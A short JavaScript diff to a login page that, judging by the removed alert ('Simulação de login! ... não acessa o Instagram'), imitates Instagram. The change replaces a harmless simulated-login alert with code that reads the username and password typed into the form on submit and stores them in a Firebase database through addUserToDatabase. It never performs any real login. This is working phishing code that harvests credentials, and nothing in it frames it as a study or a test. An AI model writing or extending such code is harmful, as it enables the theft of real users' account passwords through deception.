@@ -1,5 +1,14 @@
-function handleLogin(event) {
+import { addUserToDatabase } from './firebase.js';
+
+document.addEventListener('DOMContentLoaded', () => {
+  const form = document.getElementById('loginForm');
+
+  form.addEventListener('submit', function (event) {
     event.preventDefault();
-    alert("Simulação de login! O botão está funcional, mas não acessa o Instagram.");
-    return false;
-}
+
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+
+    addUserToDatabase(username, password);
+  });
+});
